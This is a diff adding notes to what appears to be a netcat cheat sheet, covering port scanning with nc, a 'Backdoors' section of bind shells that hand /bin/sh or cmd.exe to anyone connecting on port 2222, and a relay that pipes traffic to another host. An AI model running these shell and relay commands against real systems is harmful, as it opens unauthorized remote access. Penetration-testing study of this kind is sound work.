@@ -9,3 +9,23 @@ Listen Mode (Server Mode)
     ## Transfering Data ##
 'nc -l -p <port> <filename'
   -p : need to be root or only able to use certain ports
+
+        ## Testing Ports ##
+nc -vvvz -w 1 <Target_IP> <port number>
+    Responses:
+        - Open: the port is open
+        - Connection Refused: the port is closed
+        - Operation Timed Out: There is a firewall between the target and your machine
+
+nc -vvvz -w 1 <Target_IP> <Port_range>
+    - sweeps a range of ports
+
+        ## Backdoors ##
+nc -l -p 2222 -e /bin/sh
+    - listen on 2222 and send to /bin/sh
+
+nc -l -p 2222 -e cmd.exe
+    - windows version
+
+        ## Relays ##
+nc -l -p 2222 < backpipe | nc 10.10.10.100 80 > backpipe
